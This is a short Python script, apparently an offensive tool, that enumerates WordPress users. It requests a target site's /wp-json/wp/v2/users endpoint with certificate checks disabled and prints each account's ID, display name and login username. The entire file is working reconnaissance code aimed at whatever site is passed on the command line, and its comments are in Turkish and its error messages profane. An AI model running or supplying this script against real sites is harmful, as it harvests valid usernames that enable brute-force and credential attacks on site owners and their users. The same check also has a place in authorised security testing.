#!/usr/bin/python3
# coding: utf-8
import requests
import json
import sys

def grab_json(base_url):
    try:
        url = base_url.rstrip('/') + "/wp-json/wp/v2/users"  # URL doğru biçimlendirme
        r = requests.get(url, verify=False)
        r.raise_for_status()  # HTTP hatalarını yakalamak için
    except requests.RequestException:
        return False
    try:
        # Regex ile kontrol ekleyebilirsiniz, ancak "description" kontrolü bırakıldı
        if "description" in r.text:
            return r.text
        else:
            return False
    except Exception:
        return False

def extract_users(the_json):
    try:
        fuck_json = json.loads(the_json)
    except ValueError as e:
        print(e)
        sys.exit("{!} Fucking JSON wouldn't load")
    try:
        print("{*} Found %d users" % len(fuck_json))
        for user in fuck_json:
            user_id = user.get('id', 'N/A')  # Varsayılan değer ekledim
            full_name = user.get('name', 'N/A')
            user_name = user.get('slug', 'N/A')
            print("{>} User ID: %s, Name: %s, Username: %s" % (user_id, full_name, user_name))
    except Exception:
        sys.exit("{!} Fuck, enumeration failure")

def main(args):
    if len(args) != 2:
        sys.exit("use: %s http://site.com/wordpress" % args[0])
    json_data = grab_json(base_url=args[1])
    if json_data:
        extract_users(the_json=json_data)

if __name__ == "__main__":
    main(args=sys.argv)